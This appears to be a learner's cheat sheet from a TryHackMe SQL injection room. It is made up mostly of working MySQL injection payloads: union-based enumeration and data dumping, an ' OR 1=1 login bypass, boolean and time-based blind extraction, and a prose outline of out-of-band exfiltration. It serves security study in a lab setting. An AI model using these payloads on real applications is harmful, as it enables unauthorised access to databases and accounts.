# [SQL Injection](https://tryhackme.com/room/sqlinjectionlm)

1. [In-Band SQLi](https://s4yhii.github.io/posts/SQL-Injection/#in-band-classic-sql-injection)

    1.1 [Error-Based SQLi](https://s4yhii.github.io/posts/SQL-Injection/#error-based-sqli)

    1.2 [Union-Based SQLi](https://s4yhii.github.io/posts/SQL-Injection/#union-based-sqli)

    <br>

    - Initial query:

        ```sql
        SELECT * FROM article WHERE id = 1
        ```

    - Establish the number of columns in the table, which we can achieve by using the UNION statement:

        ```sql
        1 UNION SELECT 1, 2, 3
        ```

    - Database name:

        ```sql
        0 UNION SELECT 1, 2, DATABASE()
        ```

    - List of tables:

        ```sql
        0 UNION SELECT 1, 2, GROUP_CONCAT(TABLE_NAME) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = '<database>'
        ```

    - List of columns:

        ```sql
        0 UNION SELECT 1, 2, GROUP_CONCAT(COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = '<table>'
        ```

    - Columns' content:

        ```sql
        0 UNION SELECT 1, 2, GROUP_CONCAT(<column#1>,':',<column#2> SEPARATOR '<br>') FROM <table>
        ```

2. [Blind SQLi](https://s4yhii.github.io/posts/SQL-Injection/#inferential-blind-sql-injection)

    2.1 [Authentication Bypass](https://s4yhii.github.io/posts/SQL-Injection/#inferential-blind-sql-injection)

    - Initial query:

        ```sql
        SELECT * FROM users WHERE username='' AND password='' LIMIT 1;
        ```

    - Adding injection:

        ```sql
        ' OR 1=1;--
        ```

    - Final query:

        ```sql
        SELECT * FROM users WHERE username='' AND password='' OR 1=1;--' LIMIT 1;
        ```

    2.2 [Boolean Based](https://s4yhii.github.io/posts/SQL-Injection/#boolean-based-sqli)

    - Initial query:

        ```sql
        SELECT * FROM users WHERE username='' LIMIT 1;
        ```

    - Establish the number of columns in the users table by using the UNION statement:

        ```sql
        ' UNION SELECT 1, 2, 3;--
        ```

    - Discovering the database name:

        ```sql
        ' UNION SELECT 1, 2, 3 WHERE DATABASE() LIKE '%';--
        ```

    - Discovering the table name:

        ```sql
        ' UNION SELECT 1, 2, 3 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = '<database>' AND TABLE_NAME LIKE '%';--
        ```

    - Discovering the colummn name:

        ```sql
        ' UNION SELECT 1, 2, 3 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = '<database>' AND TABLE_NAME = '<table>' AND COLUMN_NAME LIKE '%';--
        ```

    - Discovering other colummn names:

        ```sql
        ' UNION SELECT 1, 2, 3 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = '<database>' AND TABLE_NAME = '<table>' AND COLUMN_NAME LIKE '%' AND COLUMN_NAME != '<column#1>';--
        ```

    - Discovering the content of column:

        ```sql
        ' UNION SELECT 1, 2, 3 FROM <table> WHERE <column#1> LIKE '%';--
        ```

    - Discovering the content of other columns:

        ```sql
        ' UNION SELECT 1, 2, 3 FROM <table> WHERE <column#1> = '<column#1 content>' AND <column#2> LIKE '%';--
        ```

    2.3 [Time-Based](https://s4yhii.github.io/posts/SQL-Injection/#time-based-blind-sqli)

    - Establish the number of columns in a table:

        ```sql
        ' UNION SELECT SLEEP(5);--
        ```

    - If there was no pause in the response time, we know that the query was unsuccessful, so like on previous tasks, we add another column:

        ```sql
        ' UNION SELECT SLEEP(5), 2;--
        ```

    - And so on...:

        ```sql
        ' UNION SELECT SLEEP(5),2 WHERE DATABASE() LIKE '%';--
        ```

3. [Out-of-Band SQLi](https://s4yhii.github.io/posts/SQL-Injection/#out-of-band-oast-sqli)

    1. An attacker makes a request to a website vulnerable to SQL Injection with an injection payload.

    2. The Website makes an SQL query to the database which also passes the hacker's payload.

    3. The payload contains a request which forces an HTTP request back to the hacker's machine containing data from the database.

        ![Out-of-Band SQLi](https://i.imgur.com/pInX8DT.png)

<br>

[Cheatsheets](https://rouvin.gitbook.io/ibreakstuff/website-security/sql-injection#cheatsheets)

[Automated Tools](https://rouvin.gitbook.io/ibreakstuff/website-security/sql-injection#automated-tools)